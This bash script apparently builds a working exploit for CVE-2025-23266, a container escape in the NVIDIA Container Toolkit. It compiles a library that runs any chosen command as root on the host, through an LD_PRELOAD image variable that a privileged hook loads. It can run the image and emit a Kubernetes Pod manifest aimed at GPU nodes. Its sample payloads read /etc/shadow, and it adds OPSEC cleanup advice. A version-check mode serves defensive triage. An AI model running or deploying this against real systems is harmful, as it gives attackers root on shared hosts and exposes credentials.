#!/usr/bin/env bash
# nvidiascape_build.sh - CVE-2025-23266 ("NVIDIAScape") PoC builder for NVIDIA Container Toolkit escape.
#
# NCT <=1.17.7 (GPU Operator <=25.3.0): the createContainer / enable-cuda-compat OCI hook runs on the
# HOST as root and inherits the container image's environment, including LD_PRELOAD. With
# LD_PRELOAD=/proc/self/cwd/poc.so and the hook's CWD set to the container fs, the privileged host hook
# dlopen()s the attacker library -> code execution as host root. Three-line Dockerfile.
#
# USAGE:
#   bash nvidiascape_build.sh --cmd 'id > /escape_proof' --tag evil-gpu:latest        # build only
#   bash nvidiascape_build.sh --cmd 'id; cat /etc/shadow' --tag evil-gpu:latest --run  # build + run
#   bash nvidiascape_build.sh --check                                                   # version triage
#
# Options:
#   --cmd  <sh>    command executed as host root by the hook (default: 'id > /escape_proof')
#   --tag  <tag>   image tag (default evil-gpu:latest)
#   --run          run the image through the nvidia runtime to fire the hook
#   --k8s          also emit a Kubernetes Pod manifest requesting nvidia.com/gpu
#   --check        report NCT / GPU Operator versions vs the affected range
#   --out  <dir>   build context dir (default: ./nvidiascape-poc)
#
# Dependencies: gcc, docker (with the nvidia runtime for --run). Authorized engagements only.
set -u
CMD='id > /escape_proof'
TAG='evil-gpu:latest'
RUN=0; K8S=0; CHECK=0
OUT='./nvidiascape-poc'

while [ $# -gt 0 ]; do
  case "$1" in
    --cmd) CMD="$2"; shift 2;;
    --tag) TAG="$2"; shift 2;;
    --run) RUN=1; shift;;
    --k8s) K8S=1; shift;;
    --check) CHECK=1; shift;;
    --out) OUT="$2"; shift 2;;
    -h|--help) sed -n '2,28p' "$0"; exit 0;;
    *) echo "[!] unknown arg: $1"; exit 1;;
  esac
done

if [ "$CHECK" = "1" ]; then
  echo "[*] NVIDIA Container Toolkit version triage (CVE-2025-23266 affects <=1.17.7; CDI<1.17.5)"
  for b in nvidia-ctk nvidia-container-cli nvidia-container-runtime; do
    command -v "$b" >/dev/null 2>&1 && echo "    $b: $($b --version 2>/dev/null | head -1)"
  done
  echo "    -> fixed in NCT 1.17.8 / GPU Operator 25.3.1. Also check CVE-2024-0132(<=1.16.1)/CVE-2025-23359(<1.17.4)."
  exit 0
fi

mkdir -p "$OUT"
# Escape sentinel: constructor fires when the privileged host hook loads the .so.
cat > "$OUT/poc.c" <<EOF
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor))
void escape(void) {
    /* runs as ROOT in the HOST mount namespace via the nvidia createContainer hook */
    setuid(0); setgid(0);
    system("$(printf '%s' "$CMD" | sed 's/"/\\"/g')");
}
EOF

echo "[*] compiling poc.so ..."
gcc -shared -fPIC -O2 -o "$OUT/poc.so" "$OUT/poc.c" || { echo "[!] gcc failed"; exit 1; }

cat > "$OUT/Dockerfile" <<'EOF'
FROM busybox
ENV LD_PRELOAD=/proc/self/cwd/poc.so
ADD poc.so /poc.so
EOF
# The hook's CWD is the container rootfs, so /proc/self/cwd/poc.so resolves to our library.
# poc.so already lives in $OUT (the build context) and is copied into the image via `ADD poc.so /poc.so`.

echo "[*] building image $TAG ..."
docker build -t "$TAG" "$OUT" || { echo "[!] docker build failed"; exit 1; }
echo "[*] built. Dockerfile + poc.so in $OUT/"

if [ "$RUN" = "1" ]; then
  echo "[*] running through the nvidia runtime to fire the hook ..."
  docker run --rm --runtime=nvidia --gpus all "$TAG" true 2>/dev/null \
    || docker run --rm --gpus all "$TAG" true 2>/dev/null \
    || echo "[!] run failed (no nvidia runtime/GPU here?). Schedule on a vulnerable GPU node instead."
  echo "[*] check host for /escape_proof (or your payload's output)."
fi

if [ "$K8S" = "1" ]; then
  cat <<EOF

=== Kubernetes Pod (schedule on a vulnerable GPU node) ===
apiVersion: v1
kind: Pod
metadata: { name: nvidiascape }
spec:
  restartPolicy: Never
  containers:
  - name: c
    image: $TAG
    command: ["true"]
    resources:
      limits:
        nvidia.com/gpu: 1     # requesting a GPU invokes the vulnerable createContainer hook
EOF
fi
echo "[*] OPSEC: clean up /escape_proof and any dropped artifacts on the host after validation."
